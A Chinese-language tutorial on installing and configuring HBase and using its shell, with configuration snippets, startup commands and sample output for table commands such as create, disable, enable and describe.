<p>hbase-site.xml<br>这是HBase的主配置文件。通过在 /usr/local/HBase 打开HBase主文件夹，设置数据目录到合适的位置。在 conf 文件夹里面有几个文件，现在打开hbase-site.xml文件，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#cd /usr/local/HBase/</span><br><span class="line">#cd conf</span><br><span class="line"># gedit hbase-site.xml</span><br></pre></td></tr></table></figure></p>
<p>在hbase-site.xml文件里面，找到 configuration 标签。并在其中，设置属性键名为“hbase.rootdir”，如下图所示的HBase目录。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">//Here you have to set the path where you want HBase to store its files.</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/home/hadoop/HBase/HFiles<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">//Here you have to set the path where you want HBase to store its built</span><br><span class="line">in zookeeper files.</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/home/hadoop/zookeeper<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>到此 HBase 的安装配置已成功完成。可以通过使用 HBase 的 bin 文件夹中提供 start-hbase.sh 脚本启动 HBase。为此，打开HBase 主文件夹，然后运行 HBase 启动脚本，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd /usr/local/HBase/bin</span><br><span class="line">$./start-hbase.sh</span><br></pre></td></tr></table></figure></p>
<p>如果一切顺利，当运行HBase启动脚本，它会提示一条消息：HBase has started<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">starting master, logging to /usr/local/HBase/bin/../logs/hbase-tpmaster-localhost.localdomain.out</span><br></pre></td></tr></table></figure></p>
<h2 id="在模拟分布式模式安装HBase"><a href="#在模拟分布式模式安装HBase" class="headerlink" title="在模拟分布式模式安装HBase"></a>在模拟分布式模式安装HBase</h2><p>现在，来看看如何安装HBase在模拟分布式模式。</p>
<h2 id="CONFIGURING-HBASE"><a href="#CONFIGURING-HBASE" class="headerlink" title="CONFIGURING HBASE"></a>CONFIGURING HBASE</h2><p>继续进行HBase之前，在本地系统或远程系统上配置Hadoop HDFS并确保它们正在运行。如果它正在运行则先停止HBase。</p>
<p>hbase-site.xml</p>
<p>编辑hbase-site.xml文件中添加以下属性。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>它会提到在HBase的哪种模式运行。 从本地文件系统相同的文件改变hbase.rootdir，HDFS实例地址使用hdfs://// URI 语法。在本地主机的端口8030上运行HDFS。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>&gt;hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:8030/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="启动HBase"><a href="#启动HBase" class="headerlink" title="启动HBase"></a>启动HBase</h2><p>经过配置结束后，浏览到HBase的主文件夹，并使用以下命令启动HBase。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd /usr/local/HBase</span><br><span class="line">$bin/start-hbase.sh</span><br></pre></td></tr></table></figure></p>
<p>注：在启动 HBase 之前，请确保 Hadoop 运行。</p>
<h2 id="检查在HDFS的HBase目录"><a href="#检查在HDFS的HBase目录" class="headerlink" title="检查在HDFS的HBase目录"></a>检查在HDFS的HBase目录</h2><p>HBase创建其目录在HDFS中。要查看创建的目录，浏览到Hadoop bin并键入以下命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./bin/hadoop fs -ls /hbase</span><br></pre></td></tr></table></figure></p>
<p>如果一切顺利的话，它会给下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Found 7 items</span><br><span class="line">drwxr-xr-x - hbase users 0 2014-06-25 18:58 /hbase/.tmp</span><br><span class="line">drwxr-xr-x - hbase users 0 2014-06-25 21:49 /hbase/WALs</span><br><span class="line">drwxr-xr-x - hbase users 0 2014-06-25 18:48 /hbase/corrupt</span><br><span class="line">drwxr-xr-x - hbase users 0 2014-06-25 18:58 /hbase/data</span><br><span class="line">-rw-r--r-- 3 hbase users 42 2014-06-25 18:41 /hbase/hbase.id</span><br><span class="line">-rw-r--r-- 3 hbase users 7 2014-06-25 18:41 /hbase/hbase.version</span><br><span class="line">drwxr-xr-x - hbase users 0 2014-06-25 21:49 /hbase/oldWALs</span><br></pre></td></tr></table></figure></p>
<h2 id="启动和停止主服务器"><a href="#启动和停止主服务器" class="headerlink" title="启动和停止主服务器"></a>启动和停止主服务器</h2><p>使用“local-master-backup.sh”就可以启动多达10台服务器。打开HBase的master主文件夹，并执行以下命令来启动它。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./bin/local-master-backup.sh 2 4</span><br></pre></td></tr></table></figure></p>
<p>要中止备份主服务，需要它的进程ID，它被存储在一个文件名为“/tmp/hbase-USER-X-master.pid”中，可以使用下面的命令中止备份主服务。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat /tmp/hbase-user-1-master.pid |xargs kill -9</span><br></pre></td></tr></table></figure></p>
<h2 id="启动和停止区域服务器"><a href="#启动和停止区域服务器" class="headerlink" title="启动和停止区域服务器"></a>启动和停止区域服务器</h2><p>可以使用下面的命令来运行在单一系统中的多个区域的服务器。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .bin/local-regionservers.sh start 2 3</span><br></pre></td></tr></table></figure></p>
<p>要停止区域服务器，可以使用下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .bin/local-regionservers.sh stop 3</span><br></pre></td></tr></table></figure></p>
<h2 id="启动HBaseShell"><a href="#启动HBaseShell" class="headerlink" title="启动HBaseShell"></a>启动HBaseShell</h2><p>下面给出的是启动HBase shell的步骤。打开终端，并登录为超级用户。</p>
<h2 id="启动Hadoop文件系统"><a href="#启动Hadoop文件系统" class="headerlink" title="启动Hadoop文件系统"></a>启动Hadoop文件系统</h2><p>通过Hadoop主目录下的sbin目录文件夹浏览并启动Hadoop文件系统，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd $HADOOP_HOME/sbin</span><br><span class="line">$start-all.sh</span><br></pre></td></tr></table></figure>
<h2 id="启动HBase-1"><a href="#启动HBase-1" class="headerlink" title="启动HBase"></a>启动HBase</h2><p>通过HBase根目录下的bin文件夹浏览并启动HBase。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd /usr/local/HBase</span><br><span class="line">$./bin/start-hbase.sh</span><br></pre></td></tr></table></figure></p>
<h2 id="启动HBase主服务器"><a href="#启动HBase主服务器" class="headerlink" title="启动HBase主服务器"></a>启动HBase主服务器</h2><p>这在相同目录。启动它，如下图所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$./bin/local-master-backup.sh start 2 (number signifies specific</span><br><span class="line">server.)</span><br></pre></td></tr></table></figure></p>
<h2 id="启动区域服务"><a href="#启动区域服务" class="headerlink" title="启动区域服务"></a>启动区域服务</h2><p>启动区域服务器，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$./bin/./local-regionservers.sh start 3</span><br></pre></td></tr></table></figure>
<h2 id="启动HBase-Shell"><a href="#启动HBase-Shell" class="headerlink" title="启动HBase Shell"></a>启动HBase Shell</h2><p>可以使用以下命令启动HBase shell<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cd bin</span><br><span class="line">$./hbase shell</span><br></pre></td></tr></table></figure></p>
<p>这会给出HBase shell 的提示符，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2014-12-09 14:24:27,526 INFO [main] Configuration.deprecation:</span><br><span class="line">hadoop.native.lib is deprecated. Instead, use io.native.lib.available</span><br><span class="line">HBase Shell; enter &apos;help&lt;RETURN&gt;&apos; for list of supported commands.</span><br><span class="line">Type &quot;exit&lt;RETURN&gt;&quot; to leave the HBase Shell</span><br><span class="line">Version 0.98.8-hadoop2, r6cfc8d064754251365e070a10a82eb169956d5fe, Fri</span><br><span class="line">Nov 14 18:26:29 PST 2014</span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="HBase的Web界面"><a href="#HBase的Web界面" class="headerlink" title="HBase的Web界面"></a>HBase的Web界面</h2><p>要访问 HBase 的 Web界面，在浏览器中键入以下URL<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:60010</span><br></pre></td></tr></table></figure></p>
<p>以下界面列出了当前正在运行的区域服务器，备份主服务以及HBase表。</p>
<h1 id="HBase-Shell"><a href="#HBase-Shell" class="headerlink" title="HBase Shell"></a>HBase Shell</h1><p>HBase包含可以与HBase进行通信的Shell。 HBase使用Hadoop文件系统来存储数据。它拥有一个主服务器和区域服务器。数据存储将在区域(表)的形式。这些区域被分割并存储在区域服务器。</p>
<p>主服务器管理这些区域服务器，所有这些任务发生在HDFS。下面给出的是一些由HBase Shell支持的命令。</p>
<h2 id="通用命令"><a href="#通用命令" class="headerlink" title="通用命令"></a>通用命令</h2><ol>
<li>status: 提供HBase的状态，例如，服务器的数量。</li>
<li>version: 提供正在使用HBase版本。</li>
<li>table_help: 表引用命令提供帮助。</li>
<li>whoami: 提供有关用户的信息。</li>
</ol>
<h2 id="数据定义语言"><a href="#数据定义语言" class="headerlink" title="数据定义语言"></a>数据定义语言</h2><p>这些是关于HBase在表中操作的命令。</p>
<ol>
<li><p>create: 创建一个表。</p>
</li>
<li><p>list: 列出HBase的所有表。</p>
</li>
<li><p>disable: 禁用表。</p>
</li>
<li><p>is_disabled: 验证表是否被禁用。</p>
</li>
<li><p>enable: 启用一个表。</p>
</li>
<li><p>is_enabled: 验证表是否已启用。</p>
</li>
<li><p>describe: 提供了一个表的描述。</p>
</li>
<li><p>alter: 改变一个表。</p>
</li>
<li><p>exists: 验证表是否存在。</p>
</li>
<li><p>drop: 从HBase中删除表。</p>
</li>
<li><p>drop_all: 丢弃在命令中给出匹配“regex”的表。</p>
</li>
<li><p>Java Admin API: 在此之前所有的上述命令，Java提供了一个通过API编程来管理实现DDL功能。在这个org.apache.hadoop.hbase.client包中有HBaseAdmin和HTableDescriptor 这两个重要的类提供DDL功能。</p>
</li>
</ol>
<h2 id="数据操纵语言"><a href="#数据操纵语言" class="headerlink" title="数据操纵语言"></a>数据操纵语言</h2><ol>
<li><p>put: 把指定列在指定的行中单元格的值在一个特定的表。</p>
</li>
<li><p>get: 取行或单元格的内容。</p>
</li>
<li><p>delete: 删除表中的单元格值。</p>
</li>
<li><p>deleteall: 删除给定行的所有单元格。</p>
</li>
<li><p>scan: 扫描并返回表数据。</p>
</li>
<li><p>count: 计数并返回表中的行的数目。</p>
</li>
<li><p>truncate: 禁用，删除和重新创建一个指定的表。</p>
</li>
<li><p>Java client API: 在此之前所有上述命令，Java提供了一个客户端API来实现DML功能，CRUD（创建检索更新删除）操作更多的是通过编程，在org.apache.hadoop.hbase.client包下。 在此包HTable 的 Put和Get是重要的类。</p>
</li>
</ol>
<h2 id="启动-HBase-Shell"><a href="#启动-HBase-Shell" class="headerlink" title="启动 HBase Shell"></a>启动 HBase Shell</h2><p>要访问HBase shell，必须导航进入到HBase的主文件夹。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/localhost/</span><br><span class="line">cd Hbase</span><br></pre></td></tr></table></figure></p>
<p>可以使用“hbase shell”命令来启动HBase的交互shell，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./bin/hbase shell</span><br></pre></td></tr></table></figure></p>
<p>如果已成功在系统中安装HBase，那么它会给出 HBase shell 提示符，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HBase Shell; enter &apos;help&lt;RETURN&gt;&apos; for list of supported commands.</span><br><span class="line">Type &quot;exit&lt;RETURN&gt;&quot; to leave the HBase Shell</span><br><span class="line">Version 0.94.23, rf42302b28aceaab773b15f234aa8718fff7eea3c, Wed Aug 27</span><br><span class="line">00:54:09 UTC 2014</span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt;</span><br></pre></td></tr></table></figure></p>
<p>要退出交互shell命令，在任何时候键入 exit 或使用<ctrl + c>。进一步处理检查shell功能之前，使用 list 命令用于列出所有可用命令。list是用来获取所有HBase 表的列表。首先，验证安装HBase在系统中使用如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0&gt; list</span><br></pre></td></tr></table></figure></ctrl></p>
<p>当输入这个命令，它给出下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0&gt; list</span><br><span class="line">TABLE</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase常用命令"><a href="#HBase常用命令" class="headerlink" title="HBase常用命令"></a>HBase常用命令</h1><h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>命令返回包括在系统上运行的服务器的细节和系统的状态。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):009:0&gt; status</span><br></pre></td></tr></table></figure></p>
<p>如果执行这个命令，它会返回下面的输出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):009:0&gt; status</span><br><span class="line">3 servers, 0 dead, 1.3333 average load</span><br></pre></td></tr></table></figure></p>
<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><p>该命令返回HBase系统使用的版本。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):010:0&gt; version</span><br></pre></td></tr></table></figure></p>
<p>如果执行这个命令，它会返回下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):009:0&gt; version</span><br><span class="line">0.98.8-hadoop2, r6cfc8d064754251365e070a10a82eb169956d5fe, Fri Nov 14</span><br><span class="line">18:26:29 PST 2014</span><br></pre></td></tr></table></figure></p>
<h2 id="table-help"><a href="#table-help" class="headerlink" title="table_help"></a>table_help</h2><p>此命令将引导如何使用表引用的命令。下面给出的是使用这个命令的语法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):02:0&gt; table_help</span><br></pre></td></tr></table></figure></p>
<p>当使用此命令时，它显示帮助主题表相关的命令。下面给出是此命令的部分输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; table_help</span><br><span class="line">Help for table-reference commands.</span><br><span class="line">You can either create a table via &apos;create&apos; and then manipulate the table</span><br><span class="line">via commands like &apos;put&apos;, &apos;get&apos;, etc.</span><br><span class="line">See the standard help information for how to use each of these commands.</span><br><span class="line">However, as of 0.96, you can also get a reference to a table, on which</span><br><span class="line">you can invoke commands.</span><br><span class="line">For instance, you can get create a table and keep around a reference to</span><br><span class="line">it via:</span><br><span class="line"> hbase&gt; t = create &apos;t&apos;, &apos;cf&apos;…...</span><br></pre></td></tr></table></figure></p>
<h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>该命令返回HBase用户详细信息。如果执行这个命令，返回当前HBase用户，如下图所示<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):008:0&gt; whoami</span><br><span class="line">hadoop (auth:SIMPLE)</span><br><span class="line">groups: hadoop</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase创建表"><a href="#HBase创建表" class="headerlink" title="HBase创建表"></a>HBase创建表</h1><p>可以使用命令创建一个表，在这里必须指定表名和列族名。在HBase shell中创建表的语法如下所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create &apos;&lt;table name&gt;&apos;,&apos;&lt;column family&gt;&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>下面给出的是一个表名为emp的样本模式。它有两个列族：“personal data”和“professional data”。<br>Row key | personal data | professional data </p>
<ul>
<li>| - | -<br>| |<br>| |<br>在HBase shell创建该表如下所示。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; create &apos;emp&apos;, &apos;personal data&apos;, &apos;professional data&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>它会给下面的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 row(s) in 1.1300 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=&gt; Hbase::Table - emp</span><br></pre></td></tr></table></figure></p>
<h2 id="验证创建"><a href="#验证创建" class="headerlink" title="验证创建"></a>验证创建</h2><p>可以验证是否已经创建，使用 list 命令如下所示。在这里，可以看到创建的emp表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TABLE </span><br><span class="line"></span><br><span class="line">emp</span><br><span class="line">2 row(s) in 0.0340 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="HBase列出表"><a href="#HBase列出表" class="headerlink" title="HBase列出表"></a>HBase列出表</h2><p>list 是用来列出HBase中所有表的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0 &gt; list</span><br></pre></td></tr></table></figure></p>
<p>当输入这个命令，并在HBase提示符下执行，它会显示HBase中的所有表的列表，如下图所示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0&gt; list</span><br><span class="line">TABLE</span><br><span class="line">emp</span><br></pre></td></tr></table></figure></p>
<p>在这里，可以看到一个名为表emp。</p>
<h1 id="HBase禁用表"><a href="#HBase禁用表" class="headerlink" title="HBase禁用表"></a>HBase禁用表</h1><p>要删除表或改变其设置，首先需要使用 disable 命令关闭表。使用 enable 命令，可以重新启用它。下面给出的语法是用来禁用一个表：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable &apos;emp&apos;</span><br></pre></td></tr></table></figure></p>
<p>下面给出的是一个例子，说明如何禁用表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):025:0&gt; disable &apos;emp&apos;</span><br><span class="line">0 row(s) in 1.2760 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>禁用表之后，仍然可以通过 list 和exists命令查看到。无法扫描到它存在，它会给下面的错误。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):028:0&gt; scan &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">ROW         COLUMN+CELL</span><br><span class="line"></span><br><span class="line">ERROR: emp is disabled.</span><br></pre></td></tr></table></figure></p>
<h2 id="s-disabled"><a href="#s-disabled" class="headerlink" title="s_disabled"></a>s_disabled</h2><p>这个命令是用来查看表是否被禁用。它的语法如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; is_disabled &apos;table name&apos;</span><br></pre></td></tr></table></figure></p>
<p>下面的例子验证表名为emp是否被禁用。如果禁用，它会返回true，如果没有，它会返回false。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):031:0&gt; is_disabled &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">true</span><br><span class="line"></span><br><span class="line">0 row(s) in 0.0440 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="disable-all"><a href="#disable-all" class="headerlink" title="disable_all"></a>disable_all</h2><p>此命令用于禁用所有匹配给定正则表达式的表。disable_all命令的语法如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; disable_all &apos;r.*&apos;</span><br></pre></td></tr></table></figure></p>
<p>假设有5个表在HBase，即raja, rajani, rajendra, rajesh 和 raju。下面的代码将禁用所有以 raj 开始的表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):002:0&gt; disable_all &apos;raj.*&apos;</span><br><span class="line"></span><br><span class="line">raja</span><br><span class="line">rajani</span><br><span class="line">rajendra</span><br><span class="line">rajesh</span><br><span class="line">raju</span><br><span class="line">Disable the above 5 tables (y/n)?</span><br><span class="line"></span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">5 tables successfully disabled</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase启用表"><a href="#HBase启用表" class="headerlink" title="HBase启用表"></a>HBase启用表</h1><p>启用表的语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enable &apos;emp&apos;</span><br></pre></td></tr></table></figure></p>
<p>给出下面是一个例子，使一个表启用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):005:0&gt; enable &apos;emp&apos;</span><br><span class="line">0 row(s) in 0.4580 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><p>启用表之后，扫描。如果能看到的模式，那么证明表已成功启用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; scan &apos;emp&apos;</span><br><span class="line"></span><br><span class="line">      ROW                        COLUMN+CELL</span><br><span class="line"></span><br><span class="line">1 column=personal data:city, timestamp=1417516501, value=hyderabad</span><br><span class="line"></span><br><span class="line">1 column=personal data:name, timestamp=1417525058, value=ramu</span><br><span class="line"></span><br><span class="line">1 column=professional data:designation, timestamp=1417532601, value=manager</span><br><span class="line"></span><br><span class="line">1 column=professional data:salary, timestamp=1417524244109, value=50000</span><br><span class="line"></span><br><span class="line">2 column=personal data:city, timestamp=1417524574905, value=chennai</span><br><span class="line"></span><br><span class="line">2 column=personal data:name, timestamp=1417524556125, value=ravi</span><br><span class="line"></span><br><span class="line">2 column=professional data:designation, timestamp=14175292204, value=sr:engg</span><br><span class="line"></span><br><span class="line">2 column=professional data:salary, timestamp=1417524604221, value=30000 </span><br><span class="line"></span><br><span class="line">3 column=personal data:city, timestamp=1417524681780, value=delhi</span><br><span class="line"></span><br><span class="line">3 column=personal data:name, timestamp=1417524672067, value=rajesh</span><br><span class="line"></span><br><span class="line">3 column=professional data:designation, timestamp=14175246987, value=jr:engg</span><br><span class="line"></span><br><span class="line">3 column=professional data:salary, timestamp=1417524702514, value=25000</span><br><span class="line"></span><br><span class="line">3 row(s) in 0.0400 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="is-enabled"><a href="#is-enabled" class="headerlink" title="is_enabled"></a>is_enabled</h2><p>此命令用于查找表是否被启用。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; is_enabled &apos;table name&apos;</span><br></pre></td></tr></table></figure></p>
<p>下面的代码验证表emp是否启用。如果启用，它将返回true，如果没有，它会返回false。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):031:0&gt; is_enabled &apos;emp&apos;</span><br><span class="line">true</span><br><span class="line"></span><br><span class="line">0 row(s) in 0.0440 seconds</span><br></pre></td></tr></table></figure></p>
<h1 id="HBase表描述和修改"><a href="#HBase表描述和修改" class="headerlink" title="HBase表描述和修改"></a>HBase表描述和修改</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该命令返回表的说明。它的语法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; describe &apos;table name&apos;</span><br></pre></td></tr></table></figure></p>
<p>下面给出的是对emp表的 describe 命令的输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; describe &apos;emp&apos;</span><br><span class="line">   DESCRIPTION</span><br><span class="line">      ENABLED</span><br><span class="line">      </span><br><span class="line">&apos;emp&apos;, &#123;NAME =&gt; &apos;READONLY&apos;, DATA_BLOCK_ENCODING =&gt; &apos;NONE&apos;, BLOOMFILTER</span><br><span class="line">=&gt; &apos;ROW&apos;, REPLICATION_SCOPE =&gt; &apos;0&apos;, COMPRESSION =&gt; &apos;NONE&apos;, VERSIONS =&gt;</span><br><span class="line">&apos;1&apos;, TTL true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=&gt; &apos;FOREVER&apos;, MIN_VERSIONS =&gt; &apos;0&apos;, KEEP_DELETED_CELLS =&gt; &apos;false&apos;,</span><br><span class="line">BLOCKSIZE =&gt; &apos;65536&apos;, IN_MEMORY =&gt; &apos;false&apos;, BLOCKCACHE =&gt; &apos;true&apos;&#125;, &#123;NAME</span><br><span class="line">=&gt; &apos;personal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data&apos;, DATA_BLOCK_ENCODING =&gt; &apos;NONE&apos;, BLOOMFILTER =&gt; &apos;ROW&apos;,</span><br><span class="line">REPLICATION_SCOPE =&gt; &apos;0&apos;, VERSIONS =&gt; &apos;5&apos;, COMPRESSION =&gt; &apos;NONE&apos;,</span><br><span class="line">MIN_VERSIONS =&gt; &apos;0&apos;, TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=&gt; &apos;FOREVER&apos;, KEEP_DELETED_CELLS =&gt; &apos;false&apos;, BLOCKSIZE =&gt; &apos;65536&apos;,</span><br><span class="line">IN_MEMORY =&gt; &apos;false&apos;, BLOCKCACHE =&gt; &apos;true&apos;&#125;, &#123;NAME =&gt; &apos;professional</span><br><span class="line">data&apos;, DATA_BLO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CK_ENCODING =&gt; &apos;NONE&apos;, BLOOMFILTER =&gt; &apos;ROW&apos;, REPLICATION_SCOPE =&gt; &apos;0&apos;,</span><br><span class="line">VERSIONS =&gt; &apos;1&apos;, COMPRESSION =&gt; &apos;NONE&apos;, MIN_VERSIONS =&gt; &apos;0&apos;, TTL =&gt;</span><br><span class="line">&apos;FOREVER&apos;, K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EEP_DELETED_CELLS =&gt; &apos;false&apos;, BLOCKSIZE =&gt; &apos;65536&apos;, IN_MEMORY =&gt;</span><br><span class="line">&apos;false&apos;, BLOCKCACHE =&gt; &apos;true&apos;&#125;, &#123;NAME =&gt; &apos;table_att_unset&apos;,</span><br><span class="line">DATA_BLOCK_ENCODING =&gt; &apos;NO </span><br><span class="line"></span><br><span class="line">NE&apos;, BLOOMFILTER =&gt; &apos;ROW&apos;, REPLICATION_SCOPE =&gt; &apos;0&apos;, COMPRESSION =&gt;</span><br><span class="line">&apos;NONE&apos;, VERSIONS =&gt; &apos;1&apos;, TTL =&gt; &apos;FOREVER&apos;, MIN_VERSIONS =&gt; &apos;0&apos;,</span><br><span class="line">KEEP_DELETED_CELLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=&gt; &apos;false&apos;, BLOCKSIZE =&gt; &apos;6</span><br></pre></td></tr></table></figure></p>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>alter用于更改现有表的命令。使用此命令可以更改列族的单元，设定最大数量和删除表范围运算符，并从表中删除列家族。</p>
<h2 id="更改列族单元格的最大数目"><a href="#更改列族单元格的最大数目" class="headerlink" title="更改列族单元格的最大数目"></a>更改列族单元格的最大数目</h2><p>下面给出的语法来改变列家族单元的最大数目。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt; alter &apos;t1&apos;, NAME =&gt; &apos;f1&apos;, VERSIONS =&gt; 5</span><br></pre></td></tr></table></figure></p>
<p>在下面的例子中，单元的最大数目设置为5。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; alter &apos;emp&apos;, NAME =&gt; &apos;personal data&apos;, VERSIONS =&gt; 5</span><br><span class="line">Updating all regions with the new schema...</span><br><span class="line">0/1 regions updated.</span><br><span class="line">1/1 regions updated.</span><br><span class="line">Done.</span><br><span class="line">0 row(s) in 2.3050 seconds</span><br></pre></td></tr></table></figure></p>
<h2 id="表范围运算符"><a href="#表范围运算符" class="headerlink" title="表范围运算符"></a>表范围运算符</h2><p>使用alter，可以设置和删除表范围，运算符，如MAX_FILESIZE，READONLY，MEMSTORE_FLUSHSIZE，DEFERRED_LOG_FLUSH等。</p>
<h2 id="设置只读"><a href="#设置只读" class="headerlink" title="设置只读"></a>设置只读</h2><p>下面给出的是语法，是用以设置表为只读。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase&gt;alter &apos;t1&apos;, READONLY(option)</span><br></pre></td></tr></table></figure></p>
